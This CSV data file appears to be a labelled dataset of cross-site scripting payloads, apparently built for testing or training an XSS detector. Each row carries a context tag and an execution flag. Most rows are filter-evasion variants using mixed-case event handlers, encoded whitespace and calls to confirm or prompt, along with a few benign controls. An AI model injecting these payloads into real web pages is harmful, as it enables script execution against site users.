payload,context,exec,combined
</pre><img src=x onerror=alert`1`>,html_tag,1,CTX_html_tag CTX_html_tag CTX_html_tag </pre><img src=x onerror=alert`1`>
<d3v%09onpoiNTErENTEr%0a=%0aconfirm()%0dx>v3dm0s,html_tag,1,CTX_html_tag CTX_html_tag CTX_html_tag <d3v%09onpoiNTErENTEr%0a=%0aconfirm()%0dx>v3dm0s
<a%09OnpOiNteRentEr%0a=%0a(confirm)()>v3dm0s,html_tag,1,CTX_html_tag CTX_html_tag CTX_html_tag <a%09OnpOiNteRentEr%0a=%0a(confirm)()>v3dm0s
<d3V/+/oNMoUseOVeR%0a=%0aconfirm()%0dx>v3dm0s,html_text,1,CTX_html_text CTX_html_text CTX_html_text <d3V/+/oNMoUseOVeR%0a=%0aconfirm()%0dx>v3dm0s
<Html%0aonPOinterENter%0a=%0a[8].find(confirm)>,html_tag,0,CTX_html_tag CTX_html_tag CTX_html_tag <Html%0aonPOinterENter%0a=%0a[8].find(confirm)>
<d3V%09oNpOiNTEREntER%0d=%0dconfirm()%0dx>v3dm0s,html_text,1,CTX_html_text CTX_html_text CTX_html_text <d3V%09oNpOiNTEREntER%0d=%0dconfirm()%0dx>v3dm0s
<d3V%0doNmOUsEOVER%09=%09confirm()>v3dm0s,html_text,1,CTX_html_text CTX_html_text CTX_html_text <d3V%0doNmOUsEOVER%09=%09confirm()>v3dm0s
<htML/+/oNMoUSEOVEr%0a=%0aconfirm()%0dx//,html_tag,0,CTX_html_tag CTX_html_tag CTX_html_tag <htML/+/oNMoUSEOVEr%0a=%0aconfirm()%0dx//
"<DetAILS%09ontogGlE+=+a=prompt,a()%0dx>",url_navigation,0,"CTX_url_navigation CTX_url_navigation CTX_url_navigation <DetAILS%09ontogGlE+=+a=prompt,a()%0dx>"
<d3V%09OnPOinterENteR%09=%09confirm()>v3dm0s,html_tag,1,CTX_html_tag CTX_html_tag CTX_html_tag <d3V%09OnPOinterENteR%09=%09confirm()>v3dm0s
<HTMl%0aOnpoINTereNtEr%0d=%0d(prompt)``%0dx//,html_text,0,CTX_html_text CTX_html_text CTX_html_text <HTMl%0aOnpoINTereNtEr%0d=%0d(prompt)``%0dx//
<HTML/+/OnMOuseovER%0d=%0d(prompt)``%0dx>,html_text,0,CTX_html_text CTX_html_text CTX_html_text <HTML/+/OnMOuseovER%0d=%0d(prompt)``%0dx>
<A/+/OnmoUSEovEr%0a=%0aconfirm()>v3dm0s,html_tag,1,CTX_html_tag CTX_html_tag CTX_html_tag <A/+/OnmoUSEovEr%0a=%0aconfirm()>v3dm0s
<DetailS%09ONtOGGLe+=+confirm()//,html_text,0,CTX_html_text CTX_html_text CTX_html_text <DetailS%09ONtOGGLe+=+confirm()//
<D3V%0aOnmoUSeOVEr%09=%09(confirm)()%0dx>v3dm0s,html_tag,1,CTX_html_tag CTX_html_tag CTX_html_tag <D3V%0aOnmoUSeOVEr%09=%09(confirm)()%0dx>v3dm0s
<A%0aOnPOInTErENteR%0d=%0d(prompt)``>v3dm0s,html_text,1,CTX_html_text CTX_html_text CTX_html_text <A%0aOnPOInTErENteR%0d=%0d(prompt)``>v3dm0s
<A%09OnPoInterenter%0a=%0a[8].find(confirm)%0dx>v3dm0s,html_text,1,CTX_html_text CTX_html_text CTX_html_text <A%09OnPoInterenter%0a=%0a[8].find(confirm)%0dx>v3dm0s
<a%0dOnPoiNTERentEr+=+(confirm)()%0dx>v3dm0s,html_text,0,CTX_html_text CTX_html_text CTX_html_text <a%0dOnPoiNTERentEr+=+(confirm)()%0dx>v3dm0s
<a%0aoNmoUSEovER%0d=%0d(prompt)``%0dx>v3dm0s,html_tag,1,CTX_html_tag CTX_html_tag CTX_html_tag <a%0aoNmoUSEovER%0d=%0d(prompt)``%0dx>v3dm0s
<a%0doNpOiNTerentEr%0d=%0dconfirm()%0dx>v3dm0s,html_text,1,CTX_html_text CTX_html_text CTX_html_text <a%0doNpOiNTerentEr%0d=%0dconfirm()%0dx>v3dm0s
"<A%0dOnpOiNTERentEr%0d=%0da=prompt,a()%0dx>v3dm0s",html_tag,1,"CTX_html_tag CTX_html_tag CTX_html_tag <A%0dOnpOiNTERentEr%0d=%0da=prompt,a()%0dx>v3dm0s"
<A%0aonmoUseoVER%09=%09confirm()%0dx>v3dm0s,html_tag,1,CTX_html_tag CTX_html_tag CTX_html_tag <A%0aonmoUseoVER%09=%09confirm()%0dx>v3dm0s
"<htMl/+/onpoINTEREntEr%0a=%0aa=prompt,a()%0dx>",html_tag,0,"CTX_html_tag CTX_html_tag CTX_html_tag <htMl/+/onpoINTEREntEr%0a=%0aa=prompt,a()%0dx>"
<DeTails/+/ONToGGLe+=+(prompt)``%0dx//,html_text,0,CTX_html_text CTX_html_text CTX_html_text <DeTails/+/ONToGGLe+=+(prompt)``%0dx//
<d3V%09ONpoiNTErENtEr%0d=%0d[8].find(confirm)>v3dm0s,html_tag,1,CTX_html_tag CTX_html_tag CTX_html_tag <d3V%09ONpoiNTErENtEr%0d=%0d[8].find(confirm)>v3dm0s
"<a%09oNPOIntErENter%0d=%0da=prompt,a()%0dx>v3dm0s",html_text,1,"CTX_html_text CTX_html_text CTX_html_text <a%09oNPOIntErENter%0d=%0da=prompt,a()%0dx>v3dm0s"
"<dETaILS/+/oNPoINterEnTer%0a=%0aa=prompt,a()%0dx>",html_text,0,"CTX_html_text CTX_html_text CTX_html_text <dETaILS/+/oNPoINterEnTer%0a=%0aa=prompt,a()%0dx>"
<D3V%0aoNpoiNTERentER%0d=%0dconfirm()%0dx>v3dm0s,html_tag,1,CTX_html_tag CTX_html_tag CTX_html_tag <D3V%0aoNpoiNTERentER%0d=%0dconfirm()%0dx>v3dm0s
<A%0dOnpOINTErenteR%0d=%0d[8].find(confirm)%0dx>v3dm0s,html_text,1,CTX_html_text CTX_html_text CTX_html_text <A%0dOnpOINTErenteR%0d=%0d[8].find(confirm)%0dx>v3dm0s
<DETaiLS%0doNpointeRenTer%09=%09confirm()%0dx>,html_text,0,CTX_html_text CTX_html_text CTX_html_text <DETaiLS%0doNpointeRenTer%09=%09confirm()%0dx>
<a%0aonMOusEoveR%0a=%0aconfirm()%0dx>v3dm0s,html_text,1,CTX_html_text CTX_html_text CTX_html_text <a%0aonMOusEoveR%0a=%0aconfirm()%0dx>v3dm0s
<D3V%09oNMouSeover%09=%09confirm()%0dx>v3dm0s,html_text,1,CTX_html_text CTX_html_text CTX_html_text <D3V%09oNMouSeover%09=%09confirm()%0dx>v3dm0s
<dEtaIlS%0aoNTOGgLe+=+confirm()%0dx>,html_text,0,CTX_html_text CTX_html_text CTX_html_text <dEtaIlS%0aoNTOGgLe+=+confirm()%0dx>
<D3v%09onMoUsEOvEr%0d=%0d(prompt)``%0dx>v3dm0s,html_tag,1,CTX_html_tag CTX_html_tag CTX_html_tag <D3v%09onMoUsEOvEr%0d=%0d(prompt)``%0dx>v3dm0s
<A%0dOnMOusEoVer%09=%09(confirm)()>v3dm0s,html_tag,1,CTX_html_tag CTX_html_tag CTX_html_tag <A%0dOnMOusEoVer%09=%09(confirm)()>v3dm0s
<DeTAilS%09OnPoInTEREnTer%0a=%0aconfirm()%0dx//,html_text,0,CTX_html_text CTX_html_text CTX_html_text <DeTAilS%09OnPoInTEREnTer%0a=%0aconfirm()%0dx//
<A%0dOnMoUsEoVEr%0d=%0d[8].find(confirm)>v3dm0s,html_text,1,CTX_html_text CTX_html_text CTX_html_text <A%0dOnMoUsEoVEr%0d=%0d[8].find(confirm)>v3dm0s
<img src=x>,html_tag,0,CTX_html_tag CTX_html_tag CTX_html_tag <img src=x>
<detAILS%0aONpOiNteReNTEr%09=%09[8].find(confirm)%0dx//,html_text,0,CTX_html_text CTX_html_text CTX_html_text <detAILS%0aONpOiNteReNTEr%09=%09[8].find(confirm)%0dx//
<d3V%0aoNpoINTeRentER+=+[8].find(confirm)%0dx>v3dm0s,html_tag,0,CTX_html_tag CTX_html_tag CTX_html_tag <d3V%0aoNpoINTeRentER+=+[8].find(confirm)%0dx>v3dm0s
<d3V%0aonpoINTeRENTER%0a=%0a(confirm)()>v3dm0s,html_text,1,CTX_html_text CTX_html_text CTX_html_text <d3V%0aonpoINTeRENTER%0a=%0a(confirm)()>v3dm0s
<DeTaIls/+/OntogGlE%0d=%0d(confirm)()//,html_text,0,CTX_html_text CTX_html_text CTX_html_text <DeTaIls/+/OntogGlE%0d=%0d(confirm)()//
<a/+/ONPOInTeREnter%0a=%0a[8].find(confirm)>v3dm0s,html_tag,1,CTX_html_tag CTX_html_tag CTX_html_tag <a/+/ONPOInTeREnter%0a=%0a[8].find(confirm)>v3dm0s
<D3v/+/ONpoiNTErENTeR%09=%09(confirm)()>v3dm0s,html_tag,1,CTX_html_tag CTX_html_tag CTX_html_tag <D3v/+/ONpoiNTErENTeR%09=%09(confirm)()>v3dm0s
<d3V%0aoNMOuSeoVEr%0d=%0d(prompt)``%0dx>v3dm0s,html_text,1,CTX_html_text CTX_html_text CTX_html_text <d3V%0aoNMOuSeoVEr%0d=%0d(prompt)``%0dx>v3dm0s
"<A%09ONmoUseoVeR+=+a=prompt,a()%0dx>v3dm0s",html_text,0,"CTX_html_text CTX_html_text CTX_html_text <A%09ONmoUseoVeR+=+a=prompt,a()%0dx>v3dm0s"
<A%0aOnmOuseOVer%0a=%0a(confirm)()>v3dm0s,html_text,1,CTX_html_text CTX_html_text CTX_html_text <A%0aOnmOuseOVer%0a=%0a(confirm)()>v3dm0s
"<a%0donPoInTeRentEr+=+a=prompt,a()%0dx>v3dm0s",html_tag,0,"CTX_html_tag CTX_html_tag CTX_html_tag <a%0donPoInTeRentEr+=+a=prompt,a()%0dx>v3dm0s"
"<a%09oNPOIntErENter%0d=%0da=prompt,a()%0dx>v3dm0s",html_tag,1,"CTX_html_tag CTX_html_tag CTX_html_tag <a%09oNPOIntErENter%0d=%0da=prompt,a()%0dx>v3dm0s"
<html%0dOnpointerEnTER%09=%09(prompt)``//,html_text,0,CTX_html_text CTX_html_text CTX_html_text <html%0dOnpointerEnTER%09=%09(prompt)``//
"<d3v/+/onMOuSeOVer%09=%09a=prompt,a()%0dx>v3dm0s",html_text,1,"CTX_html_text CTX_html_text CTX_html_text <d3v/+/onMOuSeOVer%09=%09a=prompt,a()%0dx>v3dm0s"
<A%0aONPOIntErENTEr%0d=%0d[8].find(confirm)%0dx>v3dm0s,html_text,1,CTX_html_text CTX_html_text CTX_html_text <A%0aONPOIntErENTEr%0d=%0d[8].find(confirm)%0dx>v3dm0s
<hTml%09OnmoUsEoveR%0d=%0d(confirm)()%0dx>,html_tag,0,CTX_html_tag CTX_html_tag CTX_html_tag <hTml%09OnmoUsEoveR%0d=%0d(confirm)()%0dx>
<A%0dOnmOuSeOvEr%09=%09confirm()>v3dm0s,html_text,1,CTX_html_text CTX_html_text CTX_html_text <A%0dOnmOuSeOvEr%09=%09confirm()>v3dm0s
<HTml%0donmoUsEover%0d=%0dconfirm()>,html_tag,0,CTX_html_tag CTX_html_tag CTX_html_tag <HTml%0donmoUsEover%0d=%0dconfirm()>
<a%0aoNPOiNtereNteR%0d=%0d(prompt)``>v3dm0s,html_text,1,CTX_html_text CTX_html_text CTX_html_text <a%0aoNPOiNtereNteR%0d=%0d(prompt)``>v3dm0s
<D3V%0dOnPOInterENtER%09=%09(confirm)()>v3dm0s,html_tag,1,CTX_html_tag CTX_html_tag CTX_html_tag <D3V%0dOnPOInterENtER%09=%09(confirm)()>v3dm0s
<D3v%09onmOUSeOveR+=+(confirm)()>v3dm0s,html_tag,0,CTX_html_tag CTX_html_tag CTX_html_tag <D3v%09onmOUSeOveR+=+(confirm)()>v3dm0s
"<HtmL%09oNMOUSeoVer%0d=%0da=prompt,a()//",html_tag,0,"CTX_html_tag CTX_html_tag CTX_html_tag <HtmL%09oNMOUSeoVer%0d=%0da=prompt,a()//"
"<DETaILs/+/OnPOInTerEntEr%0d=%0da=prompt,a()%0dx//",html_text,0,"CTX_html_text CTX_html_text CTX_html_text <DETaILs/+/OnPOInTerEntEr%0d=%0da=prompt,a()%0dx//"
<a%09onmousEOVER+=+(confirm)()%0dx>v3dm0s,html_text,0,CTX_html_text CTX_html_text CTX_html_text <a%09onmousEOVER+=+(confirm)()%0dx>v3dm0s
"<D3V%09oNmOUseOvEr%0d=%0da=prompt,a()%0dx>v3dm0s",html_text,1,"CTX_html_text CTX_html_text CTX_html_text <D3V%09oNmOUseOvEr%0d=%0da=prompt,a()%0dx>v3dm0s"
<dEtaIls%09onTOGGLE%09=%09(confirm)()%0dx//,html_text,0,CTX_html_text CTX_html_text CTX_html_text <dEtaIls%09onTOGGLE%09=%09(confirm)()%0dx//
<D3v%0dOnPOINTErEnteR%0a=%0aconfirm()%0dx>v3dm0s,html_tag,1,CTX_html_tag CTX_html_tag CTX_html_tag <D3v%0dOnPOINTErEnteR%0a=%0aconfirm()%0dx>v3dm0s
<DeTAILS%0doNTOGgle%09=%09confirm()%0dx>,html_text,0,CTX_html_text CTX_html_text CTX_html_text <DeTAILS%0doNTOGgle%09=%09confirm()%0dx>
<a%0donPOIntERenter%0a=%0aconfirm()>v3dm0s,html_tag,1,CTX_html_tag CTX_html_tag CTX_html_tag <a%0donPOIntERenter%0a=%0aconfirm()>v3dm0s
<DETailS%0aOntOGgle%0d=%0dconfirm()%0dx>,html_text,0,CTX_html_text CTX_html_text CTX_html_text <DETailS%0aOntOGgle%0d=%0dconfirm()%0dx>
<DETaIlS%0aOnToggLe%09=%09[8].find(confirm)%0dx//,html_text,0,CTX_html_text CTX_html_text CTX_html_text <DETaIlS%0aOnToggLe%09=%09[8].find(confirm)%0dx//
<DETaILs%0donpOINTERENter%0a=%0a(prompt)``%0dx>,html_tag,0,CTX_html_tag CTX_html_tag CTX_html_tag <DETaILs%0donpOINTERENter%0a=%0a(prompt)``%0dx>
price > 100,html_text,0,CTX_html_text CTX_html_text CTX_html_text price > 100
<d3v%09onpoiNTErENTEr%0a=%0aconfirm()%0dx>v3dm0s,html_text,1,CTX_html_text CTX_html_text CTX_html_text <d3v%09onpoiNTErENTEr%0a=%0aconfirm()%0dx>v3dm0s
<a%0dONPOINtErEnTER%09=%09confirm()>v3dm0s,html_tag,1,CTX_html_tag CTX_html_tag CTX_html_tag <a%0dONPOINtErEnTER%09=%09confirm()>v3dm0s
"<dEtaILS/+/oNtogGlE%0d=%0da=prompt,a()%0dx>",html_tag,0,"CTX_html_tag CTX_html_tag CTX_html_tag <dEtaILS/+/oNtogGlE%0d=%0da=prompt,a()%0dx>"
<D3v%0dOnPOiNterEnteR%0a=%0a[8].find(confirm)>v3dm0s,html_tag,1,CTX_html_tag CTX_html_tag CTX_html_tag <D3v%0dOnPOiNterEnteR%0a=%0a[8].find(confirm)>v3dm0s
<a%0dONMoUSeovEr%09=%09[8].find(confirm)%0dx>v3dm0s,html_text,1,CTX_html_text CTX_html_text CTX_html_text <a%0dONMoUSeovEr%09=%09[8].find(confirm)%0dx>v3dm0s
"<htmL%0aONMouSEoVER%0d=%0da=prompt,a()>",html_tag,0,"CTX_html_tag CTX_html_tag CTX_html_tag <htmL%0aONMouSEoVER%0d=%0da=prompt,a()>"
"<A%0aoNMoUseoVEr%0d=%0da=prompt,a()%0dx>v3dm0s",html_tag,1,"CTX_html_tag CTX_html_tag CTX_html_tag <A%0aoNMoUseoVEr%0d=%0da=prompt,a()%0dx>v3dm0s"
<HTMl/+/ONmoUSeOVER%09=%09confirm()%0dx//,html_text,0,CTX_html_text CTX_html_text CTX_html_text <HTMl/+/ONmoUSeOVER%09=%09confirm()%0dx//
<A%0donPOINTerENTEr%0d=%0dconfirm()>v3dm0s,html_tag,1,CTX_html_tag CTX_html_tag CTX_html_tag <A%0donPOINTerENTEr%0d=%0dconfirm()>v3dm0s
<A%0aoNPoiNTEReNTER%0d=%0d(prompt)``%0dx>v3dm0s,html_text,1,CTX_html_text CTX_html_text CTX_html_text <A%0aoNPoiNTEReNTER%0d=%0d(prompt)``%0dx>v3dm0s
<a%0aONMOusEoVER+=+(prompt)``%0dx>v3dm0s,html_tag,0,CTX_html_tag CTX_html_tag CTX_html_tag <a%0aONMOusEoVER+=+(prompt)``%0dx>v3dm0s
<d3v%09OnpoiNterEnteR%09=%09(confirm)()>v3dm0s,html_tag,1,CTX_html_tag CTX_html_tag CTX_html_tag <d3v%09OnpoiNterEnteR%09=%09(confirm)()>v3dm0s
<a%0dOnpoInTERENTEr%0a=%0a(confirm)()%0dx>v3dm0s,html_tag,1,CTX_html_tag CTX_html_tag CTX_html_tag <a%0dOnpoInTERENTEr%0a=%0a(confirm)()%0dx>v3dm0s
"<d3V%0doNPOInTerEnter%0a=%0aa=prompt,a()%0dx>v3dm0s",html_text,1,"CTX_html_text CTX_html_text CTX_html_text <d3V%0doNPOInTerEnter%0a=%0aa=prompt,a()%0dx>v3dm0s"
<A%0aONMouseOVEr+=+confirm()>v3dm0s,script_block,0,CTX_script_block CTX_script_block CTX_script_block <A%0aONMouseOVEr+=+confirm()>v3dm0s
<DeTAiLS%0aONPoiNTErentER%0a=%0a[8].find(confirm)>,html_tag,0,CTX_html_tag CTX_html_tag CTX_html_tag <DeTAiLS%0aONPoiNTErentER%0a=%0a[8].find(confirm)>
<D3V%0aOnMoUSeOvEr%0d=%0dconfirm()>v3dm0s,html_text,1,CTX_html_text CTX_html_text CTX_html_text <D3V%0aOnMoUSeOvEr%0d=%0dconfirm()>v3dm0s
<dETaiLs/+/OnpoinTeRenter%0d=%0d(confirm)()%0dx>,html_text,0,CTX_html_text CTX_html_text CTX_html_text <dETaiLs/+/OnpoinTeRenter%0d=%0d(confirm)()%0dx>
<a%09OnMOUsEOVer%0d=%0dconfirm()>v3dm0s,html_text,1,CTX_html_text CTX_html_text CTX_html_text <a%09OnMOUsEOVer%0d=%0dconfirm()>v3dm0s
<a/+/onpoInTERenTEr%09=%09confirm()%0dx>v3dm0s,html_tag,1,CTX_html_tag CTX_html_tag CTX_html_tag <a/+/onpoInTERenTEr%09=%09confirm()%0dx>v3dm0s
<script>prompt(1)</script>,html_tag,1,CTX_html_tag CTX_html_tag CTX_html_tag <script>prompt(1)</script>
<hTMl/+/oNmOUSeoVER%0a=%0aconfirm()>,html_tag,0,CTX_html_tag CTX_html_tag CTX_html_tag <hTMl/+/oNmOUSeoVER%0a=%0aconfirm()>
<d3V%09OnpOINteREnTeR%09=%09[8].find(confirm)>v3dm0s,html_text,1,CTX_html_text CTX_html_text CTX_html_text <d3V%09OnpOINteREnTeR%09=%09[8].find(confirm)>v3dm0s
<a%0aoNMOuSEoVEr%09=%09[8].find(confirm)%0dx>v3dm0s,html_tag,1,CTX_html_tag CTX_html_tag CTX_html_tag <a%0aoNMOuSEoVEr%09=%09[8].find(confirm)%0dx>v3dm0s
<A%0aONMouseOVEr+=+confirm()>v3dm0s,html_tag,0,CTX_html_tag CTX_html_tag CTX_html_tag <A%0aONMouseOVEr+=+confirm()>v3dm0s
<hTmL%09OnpoiNtEreNter%0d=%0d(confirm)()%0dx//,html_text,0,CTX_html_text CTX_html_text CTX_html_text <hTmL%09OnpoiNtEreNter%0d=%0d(confirm)()%0dx//
<d3V/+/oNMOUSEOVeR%09=%09confirm()%0dx>v3dm0s,html_tag,1,CTX_html_tag CTX_html_tag CTX_html_tag <d3V/+/oNMOUSEOVeR%09=%09confirm()%0dx>v3dm0s
<DEtAIls%09ONtOGgLe%0d=%0d(prompt)``%0dx>,html_text,0,CTX_html_text CTX_html_text CTX_html_text <DEtAIls%09ONtOGgLe%0d=%0d(prompt)``%0dx>
<d3v%0aONPoiNTErenteR%09=%09(prompt)``>v3dm0s,html_text,1,CTX_html_text CTX_html_text CTX_html_text <d3v%0aONPoiNTErenteR%09=%09(prompt)``>v3dm0s
"<A%0aonMoUseOVeR%0a=%0aa=prompt,a()%0dx>v3dm0s",html_text,1,"CTX_html_text CTX_html_text CTX_html_text <A%0aonMoUseOVeR%0a=%0aa=prompt,a()%0dx>v3dm0s"
<D3V%09OnmOuSeOvER%0a=%0aconfirm()%0dx>v3dm0s,html_text,1,CTX_html_text CTX_html_text CTX_html_text <D3V%09OnmOuSeOvER%0a=%0aconfirm()%0dx>v3dm0s
"<a%0doNpoINTereNtER+=+a=prompt,a()>v3dm0s",html_text,0,"CTX_html_text CTX_html_text CTX_html_text <a%0doNpoINTereNtER+=+a=prompt,a()>v3dm0s"
<D3V/+/onPointerEnteR%0d=%0dconfirm()%0dx>v3dm0s,html_text,1,CTX_html_text CTX_html_text CTX_html_text <D3V/+/onPointerEnteR%0d=%0dconfirm()%0dx>v3dm0s
<a%0dONpoINteREntEr%0d=%0d(confirm)()%0dx>v3dm0s,html_text,1,CTX_html_text CTX_html_text CTX_html_text <a%0dONpoINteREntEr%0d=%0d(confirm)()%0dx>v3dm0s
<d3v%09onmOUSeoveR%09=%09confirm()>v3dm0s,html_text,1,CTX_html_text CTX_html_text CTX_html_text <d3v%09onmOUSeoveR%09=%09confirm()>v3dm0s
<d3V/+/OnmOuSeoVeR%09=%09(prompt)``%0dx>v3dm0s,html_tag,1,CTX_html_tag CTX_html_tag CTX_html_tag <d3V/+/OnmOuSeoVeR%09=%09(prompt)``%0dx>v3dm0s
"<deTAIls%09ONpoINTEREnTER+=+a=prompt,a()%0dx>",html_tag,0,"CTX_html_tag CTX_html_tag CTX_html_tag <deTAIls%09ONpoINTEREnTER+=+a=prompt,a()%0dx>"
<D3V/+/ONMoUSeOveR%09=%09confirm()>v3dm0s,html_tag,1,CTX_html_tag CTX_html_tag CTX_html_tag <D3V/+/ONMoUSeOveR%09=%09confirm()>v3dm0s
<HtmL%0aonPoiNTerenTer+=+confirm()//,html_tag,0,CTX_html_tag CTX_html_tag CTX_html_tag <HtmL%0aonPoiNTerenTer+=+confirm()//
<dETAILS%09oNpOINTEREnTER%0a=%0a(confirm)()>,url_href,0,CTX_url_href CTX_url_href CTX_url_href <dETAILS%09oNpOINTEREnTER%0a=%0a(confirm)()>
<D3v%0doNmoUSeOveR%0a=%0a(prompt)``>v3dm0s,html_tag,1,CTX_html_tag CTX_html_tag CTX_html_tag <D3v%0doNmoUSeOveR%0a=%0a(prompt)``>v3dm0s
<a%0aonPOiNtEreNTER%0a=%0a[8].find(confirm)>v3dm0s,html_text,1,CTX_html_text CTX_html_text CTX_html_text <a%0aonPOiNtEreNTER%0a=%0a[8].find(confirm)>v3dm0s
<dEtAiLS/+/OntoGgLE%0a=%0aconfirm()%0dx>,html_text,0,CTX_html_text CTX_html_text CTX_html_text <dEtAiLS/+/OntoGgLE%0a=%0aconfirm()%0dx>
"<d3V%0aOnpoiNtereNteR%0a=%0aa=prompt,a()>v3dm0s",html_text,1,"CTX_html_text CTX_html_text CTX_html_text <d3V%0aOnpoiNtereNteR%0a=%0aa=prompt,a()>v3dm0s"
<d3v/+/oNmoUsEOVEr%0d=%0d(prompt)``%0dx>v3dm0s,html_text,1,CTX_html_text CTX_html_text CTX_html_text <d3v/+/oNmoUsEOVEr%0d=%0d(prompt)``%0dx>v3dm0s
<a%0aONMOusEoVEr%0a=%0aconfirm()%0dx>v3dm0s,html_text,1,CTX_html_text CTX_html_text CTX_html_text <a%0aONMOusEoVEr%0a=%0aconfirm()%0dx>v3dm0s
<D3v%09oNmOuseoveR+=+(prompt)``>v3dm0s,html_text,0,CTX_html_text CTX_html_text CTX_html_text <D3v%09oNmOuseoveR+=+(prompt)``>v3dm0s
<tag attribute=value>,html_text,0,CTX_html_text CTX_html_text CTX_html_text <tag attribute=value>
<d3V%0dOnmOUSEOVEr%0d=%0d[8].find(confirm)>v3dm0s,html_tag,1,CTX_html_tag CTX_html_tag CTX_html_tag <d3V%0dOnmOUSEOVEr%0d=%0d[8].find(confirm)>v3dm0s
<HtMl%0donMoUSeover+=+confirm()//,html_tag,0,CTX_html_tag CTX_html_tag CTX_html_tag <HtMl%0donMoUSeover+=+confirm()//
<DetAiLS%0dONTOggLE%0a=%0a(confirm)()%0dx>,html_tag,0,CTX_html_tag CTX_html_tag CTX_html_tag <DetAiLS%0dONTOggLE%0a=%0a(confirm)()%0dx>
<a%0aonPOiNtEreNTER%0a=%0a[8].find(confirm)>v3dm0s,html_tag,1,CTX_html_tag CTX_html_tag CTX_html_tag <a%0aonPOiNtEreNTER%0a=%0a[8].find(confirm)>v3dm0s
<a%0doNPoiNteReNter+=+(prompt)``%0dx>v3dm0s,html_text,0,CTX_html_text CTX_html_text CTX_html_text <a%0doNPoiNteReNter+=+(prompt)``%0dx>v3dm0s
<A/+/onmOuseoVEr%0d=%0d(confirm)()%0dx>v3dm0s,html_text,1,CTX_html_text CTX_html_text CTX_html_text <A/+/onmOuseoVEr%0d=%0d(confirm)()%0dx>v3dm0s
<HTMl%0aoNmouseoVer+=+confirm()//,html_text,0,CTX_html_text CTX_html_text CTX_html_text <HTMl%0aoNmouseoVer+=+confirm()//
"data:text/html,<script>alert(1)</script>",url_navigation,1,"CTX_url_navigation CTX_url_navigation CTX_url_navigation data:text/html,<script>alert(1)</script>"
"<hTML%09ONmoUSeovER%0d=%0da=prompt,a()%0dx>",html_tag,0,"CTX_html_tag CTX_html_tag CTX_html_tag <hTML%09ONmoUSeovER%0d=%0da=prompt,a()%0dx>"
<DETaIls%0dOnTOgGLe%09=%09[8].find(confirm)//,html_tag,0,CTX_html_tag CTX_html_tag CTX_html_tag <DETaIls%0dOnTOgGLe%09=%09[8].find(confirm)//
<A%09ONpOIntereNtER%09=%09confirm()%0dx>v3dm0s,html_text,1,CTX_html_text CTX_html_text CTX_html_text <A%09ONpOIntereNtER%09=%09confirm()%0dx>v3dm0s
<detAIlS%0aONPoiNtErEnTeR+=+(confirm)()>,html_tag,0,CTX_html_tag CTX_html_tag CTX_html_tag <detAIlS%0aONPoiNtErEnTeR+=+(confirm)()>
<d3v%0dONPointEREnTer%0a=%0aconfirm()>v3dm0s,html_attribute,0,CTX_html_attribute CTX_html_attribute CTX_html_attribute <d3v%0dONPointEREnTer%0a=%0aconfirm()>v3dm0s
<D3V%0aonPOintERENter%0d=%0dconfirm()%0dx>v3dm0s,html_text,1,CTX_html_text CTX_html_text CTX_html_text <D3V%0aonPOintERENter%0d=%0dconfirm()%0dx>v3dm0s
javascript:confirm`1`,html_text,0,CTX_html_text CTX_html_text CTX_html_text javascript:confirm`1`
<script>alert</script>,html_text,0,CTX_html_text CTX_html_text CTX_html_text <script>alert</script>
"""><img src=x onerror=confirm(1)>",html_attribute,1,"CTX_html_attribute CTX_html_attribute CTX_html_attribute ""><img src=x onerror=confirm(1)>"
<d3V%0aonpoinTeRENTeR%0a=%0aconfirm()>v3dm0s,html_tag,1,CTX_html_tag CTX_html_tag CTX_html_tag <d3V%0aonpoinTeRENTeR%0a=%0aconfirm()>v3dm0s
<htmL%0donMoUsEoVeR%0a=%0a(prompt)``//,html_tag,0,CTX_html_tag CTX_html_tag CTX_html_tag <htmL%0donMoUsEoVeR%0a=%0a(prompt)``//
<a%0donpoiNtERENTer%0d=%0d(confirm)()>v3dm0s,html_text,1,CTX_html_text CTX_html_text CTX_html_text <a%0donpoiNtERENTer%0d=%0d(confirm)()>v3dm0s
<deTAILs/+/OnpoINTErEntER+=+(confirm)()%0dx>,html_text,0,CTX_html_text CTX_html_text CTX_html_text <deTAILs/+/OnpoINTErEntER+=+(confirm)()%0dx>
<D3V%09OnPOiNtEReNTER%0d=%0d(prompt)``>v3dm0s,html_text,1,CTX_html_text CTX_html_text CTX_html_text <D3V%09OnPOiNtEReNTER%0d=%0d(prompt)``>v3dm0s
<D3v%09ONmOUseOVEr%0a=%0a[8].find(confirm)%0dx>v3dm0s,html_text,1,CTX_html_text CTX_html_text CTX_html_text <D3v%09ONmOUseOVEr%0a=%0a[8].find(confirm)%0dx>v3dm0s
